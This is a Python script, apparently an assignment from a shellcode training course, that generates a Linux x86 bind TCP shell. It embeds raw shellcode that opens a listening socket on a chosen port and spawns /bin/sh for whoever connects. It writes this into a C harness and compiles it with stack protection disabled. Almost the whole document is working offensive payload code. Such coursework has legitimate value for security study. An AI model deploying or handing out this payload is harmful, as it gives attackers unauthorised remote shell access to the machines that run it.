# Author: bigb0ss
# Student ID: SLAE-1542

import sys
import argparse
import subprocess
import string
import socket

""" Arguments """
parser = argparse.ArgumentParser(description = '[+] Bind TCP Shell Generator')
parser.add_argument('-p', '--port', help='\tBind Port')
args = parser.parse_args()


def error():
    parser.print_help()
    exit(1)

def exploit(port):
    
    # Bind TCP Shell 
    shellcode = '\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\x66\\xb3\\x01\\x52\\x53\\x6a\\x02'
    shellcode+= '\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x52\\x52\\x52\\x66\\x68'
    
    print "[INFO] Bind Port: " + port

    port = hex(socket.htons(int(port)))
    a = port[2:4]
    b = port[4:]
    if b == '':
        b = '0'
    port = '\\x{0}\\x{1}'.format(b, a)

    #port = '\\x11\\x5c' = 4444
    
    shellcode2 = '\\x66\\x6a\\x02'
    shellcode2+= '\\x89\\xe6\\xb0\\x66\\xb3\\x02\\x6a\\x10\\x56\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66'
    shellcode2+= '\\xb3\\x04\\x52\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x05\\x52\\x52\\x57\\x89'
    shellcode2+= '\\xe1\\xcd\\x80\\x89\\xc7\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xfe'
    shellcode2+= '\\xc9\\xcd\\x80\\x75\\xf4\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69'
    shellcode2+= '\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80'

    # Adding shellcode to shellcode.c
    outShellcode = ''
    outShellcode+= '#include<stdio.h>\n'
    outShellcode+= '#include<string.h>\n'
    outShellcode+= '\n'
    outShellcode+= 'unsigned char code[] = \ \n'
    outShellcode+= '"{0}{1}{2}";'.format(shellcode, port, shellcode2)
    outShellcode+= '\n'
    outShellcode+= 'main()\n'
    outShellcode+= '{\n'
    outShellcode+= 'printf("Shellcode Length:  %d", strlen(code));\n'
    outShellcode+= '\tint (*ret)() = (int(*)())code;\n'
    outShellcode+= '\tret();\n'
    outShellcode+= '}\n'
    #print outShellcode

    # Creating shellcode.c
    filename = "exploit.c"
    outfile = open(filename, 'w')
    outfile.write(outShellcode)
    outfile.close()
    

    print "[INFO] Creating File: exploit.c"

    # Compiling shellcode.c
    subprocess.call(["gcc", "-fno-stack-protector", "-z", "execstack", filename, "-o", "exploit", "-w"])
    print "[INFO] Compiled Executable: exploit"

if __name__ == "__main__":
    inputPort = args.port if args.port != None else error()

    exploit(inputPort)

